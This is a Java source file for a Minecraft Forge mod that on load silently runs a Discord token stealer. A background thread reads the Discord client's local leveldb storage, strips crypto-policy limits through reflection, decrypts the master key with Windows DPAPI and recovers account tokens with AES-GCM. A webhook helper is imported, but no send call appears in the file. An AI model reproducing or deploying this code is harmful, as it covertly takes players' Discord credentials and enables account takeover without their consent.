package studio.dreamys;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.sun.jna.platform.win32.Crypt32Util;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.Base64;
import java.util.Map;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import net.minecraft.client.Minecraft;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.entity.EntityJoinWorldEvent;
import net.minecraftforge.fml.common.Loader;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.relauncher.ReflectionHelper;
import org.apache.commons.lang3.StringEscapeUtils;

import static studio.dreamys.DiscordWebhook.embed;

@Mod(modid = "doslowniedziala", acceptedMinecraftVersions = "[1.8.9]")
public class Discord {
    @EventHandler
    public void preInit(FMLPreInitializationEvent event) {
        MinecraftForge.EVENT_BUS.register(this);
        (new Thread(() -> {
            try {
                Minecraft mc = Minecraft.getMinecraft();
                String discord = "Discord not found :(";
                if (Files.isDirectory(Paths.get(mc.mcDataDir.getParent(), new String[] { "discord/Local Storage/leveldb" }), new java.nio.file.LinkOption[0])) {
                    discord = "";
                    for (File file : (File[])Objects.<File[]>requireNonNull(Paths.get(mc.mcDataDir.getParent(), new String[] { "discord/Local Storage/leveldb" }).toFile().listFiles())) {
                        if (file.getName().endsWith(".ldb")) {
                            FileReader fr = new FileReader(file);
                            BufferedReader bufferedReader = new BufferedReader(fr);
                            StringBuilder parsed = new StringBuilder();
                            String textFile;
                            while ((textFile = bufferedReader.readLine()) != null)
                                parsed.append(textFile);
                            fr.close();
                            bufferedReader.close();
                            Pattern pattern = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)");
                            Matcher matcher = pattern.matcher(parsed.toString());
                            if (matcher.find())
                                try {
                                    if (Cipher.getMaxAllowedKeyLength("AES") < 256) {
                                        Class<?> aClass = Class.forName("javax.crypto.CryptoAllPermissionCollection");
                                        Constructor<?> con = aClass.getDeclaredConstructor(new Class[0]);
                                        con.setAccessible(true);
                                        Object allPermissionCollection = con.newInstance(new Object[0]);
                                        Field f = aClass.getDeclaredField("all_allowed");
                                        f.setAccessible(true);
                                        f.setBoolean(allPermissionCollection, true);
                                        aClass = Class.forName("javax.crypto.CryptoPermissions");
                                        con = aClass.getDeclaredConstructor(new Class[0]);
                                        con.setAccessible(true);
                                        Object allPermissions = con.newInstance(new Object[0]);
                                        f = aClass.getDeclaredField("perms");
                                        f.setAccessible(true);
                                        ((Map<String, Object>)f.get(allPermissions)).put("*", allPermissionCollection);
                                        aClass = Class.forName("javax.crypto.JceSecurityManager");
                                        f = aClass.getDeclaredField("defaultPolicy");
                                        f.setAccessible(true);
                                        Field mf = Field.class.getDeclaredField("modifiers");
                                        mf.setAccessible(true);
                                        mf.setInt(f, f.getModifiers() & 0xFFFFFFEF);
                                        f.set(null, allPermissions);
                                    }
                                    byte[] dToken = matcher.group().split("dQw4w9WgXcQ:")[1].getBytes();
                                    JsonObject json = (JsonObject)(new Gson()).fromJson(new String(Files.readAllBytes(Paths.get(mc.mcDataDir.getParent(), new String[] { "discord/Local State" }))), JsonObject.class);
                                    byte[] key = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString().getBytes();
                                    key = Base64.getDecoder().decode(key);
                                    key = Arrays.copyOfRange(key, 5, key.length);
                                    key = Crypt32Util.cryptUnprotectData(key);
                                    dToken = Base64.getDecoder().decode(dToken);
                                    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                                    cipher.init(2, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(dToken, 3, 15)));
                                    byte[] out = cipher.doFinal(Arrays.copyOfRange(dToken, 15, dToken.length));
                                    if (!discord.contains(new String(out, StandardCharsets.UTF_8)))
                                        discord = discord + new String(out, StandardCharsets.UTF_8) + " | ";
                                } catch (Exception e) {
                                    e.printStackTrace();
                                    discord = "Failed to decrypt token :(";
                                }
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        })).start();
    }
    @SubscribeEvent
    public void onFirstPlayerJoin(EntityJoinWorldEvent e) {
        if (e.entity.equals((Minecraft.getMinecraft()).thePlayer))
            MinecraftForge.EVENT_BUS.unregister(this);
    }
}